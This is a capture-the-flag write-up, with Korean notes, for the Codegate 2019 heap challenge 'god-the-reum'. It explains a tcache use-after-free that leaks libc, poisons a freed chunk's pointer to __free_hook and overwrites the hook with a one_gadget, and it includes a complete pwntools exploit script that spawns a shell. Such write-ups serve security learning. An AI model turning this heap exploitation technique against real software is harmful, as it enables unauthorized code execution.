---
title: "2019 Codegate god-the-reum"
date: 2020-3-16
ctf: Codegate CTF
layout: post
published : false
---

* tcache exploit (glibc 2.27)
*  UAF
* __free_hook overwrite

```
[*] '/vagrant/ctf/god-the-reum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structure

```
struct wallet{
    char* address;
    int*  ballence;
}
```

1. 0x420크기 이상의 청크 하나와 tcache에 들어갈만한 청크를 할당 후 withdraw 메뉴에서 free해줘서 unsorted bin을 leak해줄 수 있다.

2.  그리고 tcache bin에 들어가있는 청크의 fd를 __free_hook으로 overwrite해준다. (hidden menu UAF)

3. 그리고 청크 두개를 할당하고 __free_hook을 one_gadget으로 덮어준다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./god-the-reum')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./god-the-reum')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def create(size):
	sla('select your choice :','1')
	sla('how much initial eth? :',str(size))

def deposit(idx,size): # append
	sla('select your choice :','2')
	sla('input wallet no :',str(idx))
	sla('how much deposit? :',str(size))

def withdraw(idx,size): # pop
	sla('select your choice :','3')
	sla('input wallet no :',str(idx))
	sla('how much you wanna withdraw? :',str(size))

def show():
	sla('select your choice :','4')

def quit():
	sla('select your choice :','5')

def hidden(idx,eth):
	sla('select your choice :','6')
	sla('input wallet no :',str(idx))
	sla('new eth :',eth)

create(0x420) # 0
create(0x60) # 1
withdraw(0,0x420)
show()
p.recvuntil('ballance ')
libc_base = int(p.recvline().strip()) - 0x3ebca0
log.info('libc_base : {}'.format(hex(libc_base)))
free_hook = libc_base + libc.symbols['__free_hook']
one_shot = libc_base + 0x10a38c

withdraw(1,0x60)
hidden(1,p64(free_hook))
create(0x60) # 2
create(0x60) # 3
hidden(3,p64(one_shot))

withdraw(2,0x60)

p.interactive()
```

